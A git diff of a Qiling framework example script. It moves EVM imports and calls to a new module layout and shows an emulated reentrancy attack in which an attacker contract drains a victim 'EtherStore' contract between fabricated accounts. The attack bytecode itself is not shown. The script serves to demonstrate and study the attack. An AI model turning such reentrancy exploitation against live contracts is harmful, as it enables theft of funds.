@@ -1,25 +1,25 @@
 import sys
 
-sys.path.append("../../../..")
+sys.path.append("../..")
 from qiling import *
-from qiling.engine.evm.vm.utils import bytecode_to_bytes, runtime_code_detector
-from qiling.engine.evm.vm.vm import BaseVM
-from qiling.engine.evm.constants import CREATE_CONTRACT_ADDRESS
+from qiling.arch.evm.vm.utils import bytecode_to_bytes, runtime_code_detector
+from qiling.arch.evm.vm.vm import BaseVM
+from qiling.arch.evm.constants import CREATE_CONTRACT_ADDRESS
 
 
 def template(vic_contract, deposit, withdraw):
     ql = Qiling(archtype="evm")  
-    vm:BaseVM = ql.arch.evm.emu.vm
+    vm:BaseVM = ql.arch.emu.vm
 
     C1 = b'\xaa' * 20
     C2 = b'\xbb' * 20
     User1 = b'\xcc' * 20
     User2 = b'\xde\xad\xbe\xef' * 5
 
-    ql.arch.evm.create_account(C1)
-    ql.arch.evm.create_account(C2)
-    ql.arch.evm.create_account(User1, 100*10**18)
-    ql.arch.evm.create_account(User2, 100*10**18)
+    ql.arch.create_account(C1)
+    ql.arch.create_account(C2)
+    ql.arch.create_account(User1, 100*10**18)
+    ql.arch.create_account(User2, 100*10**18)
 
     EtherStore_contract = vic_contract
 
@@ -47,7 +47,7 @@ def template(vic_contract, deposit, withdraw):
     # print(res.output)
     print('Victim balance: ', vm.state.get_balance(User1)/10**18)
 
-    code2 = bytecode_to_bytes(Attack_contract+ql.arch.evm.abi.convert(['address'], [C1]))
+    code2 = bytecode_to_bytes(Attack_contract+ql.arch.abi.convert(['address'], [C1]))
     # print(code2.hex())
     print('\n------ Deploy Attack Contract')
 
@@ -63,7 +63,7 @@ def template(vic_contract, deposit, withdraw):
     
     print('\n------ Attacker deposit 1 ETH to DeFi contract, Start Reentrancy Attack')
     # 4. User2 pwnEtherStore with 1ETH
-    call_data = '0xa75e4625' + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes(deposit)]) + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes(withdraw)])
+    call_data = '0xa75e4625' + ql.arch.abi.convert(['bytes4'], [bytecode_to_bytes(deposit)]) + ql.arch.abi.convert(['bytes4'], [bytecode_to_bytes(withdraw)])
 
     msg4 = vm.build_message(None, 1, 3000000, C2, User2, 1*10**18, bytecode_to_bytes(call_data), rt_code1)
     res = vm.execute_message(msg4)
